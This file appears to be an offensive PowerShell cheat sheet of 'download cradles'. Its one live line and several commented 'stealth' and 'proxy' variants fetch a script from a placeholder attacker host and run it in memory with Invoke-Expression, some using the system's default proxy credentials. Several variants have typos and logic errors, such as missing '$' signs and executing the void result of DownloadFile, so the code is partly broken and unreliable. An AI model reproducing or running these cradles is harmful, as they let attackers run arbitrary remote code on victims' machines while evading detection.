$script = "PowerScript.ps1"
$url = "http://your_ip/$script"
Invoke-Expression (New-Object Net.Webclient).DownloadString($url)

<#
Mode: Stealth, will execute in memory

$downloader = New-Object System.Net.Webclient
$downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36"
$payload = "script.ps1"

$url = "http://your_ip/$payload"
$commmand = $downloader.DownloadString($url)
Invoke-Expression $command
#>

<#
Mode: Save to disk

$downloader = New-Object System.Net.Webclient
$downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36"

$payload = "script.ps1"
$url = "http://your_ip/$payload"
$localfile = "C:\Program Files (x86)\Program.exe"

$cmd = $downloader.DownloadFile($url, $localfile)
Invoke-Expression $cmd
#>

<#
Mode: Using Proxy

$downloader = New-Object System.Net.WebClient
$payload = "script.ps1"
$url = "http://your_ip/$payload"
$localfile = "C:\Program Files (x86)\Program.exe"

$cmd = $downloader.DownloadFile($url, $localfile)

$proxy = [Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$downloader.Proxy = proxy

Invoke-Expression $cmd
#>

<#
Mode: Stealth, will execute in memory

$payload = "script.ps1"
$url = "http://your_ip/$payload"

$req = [System.Net.WebRequest]::Create($url)
$res  = $req.GetResponse()

$proxy = [Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$req.Proxy = $proxy

$cmd = ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()

Invoke-Expression $cmd
#>

<#
Mode: Stealth, will execute in memory

$downloader = New-Object -ComObject Msxml2.XMLHTTP
$payload = "script.ps1"
$url = "http://your_ip/$payload"

$downloader.open("GET", $url, $false)
downloader.send()

Invoke-Expression $downloader.responseText
#>

<#
Mode: Stealth, will execute in memory

$downloader = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$payload = "script.ps1"
$url = "http://your_ip/$payload"

$downloader.open("GET", $url, $false)
downloader.send()

Invoke-Expression $downloader.responseText
#>


<#
Mode: Stealth, will execute in memory

$xmldoc = New-Object System.Xml.XmlDocument
$payload = "file.xml"
$url = "http://your_ip/$payload"

$xmldoc.Load($url)
$cmd = $xmldoc.command.a.execute
Invoke-Expression $cmd


xml doc contents looks like

<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
 </command>
#>
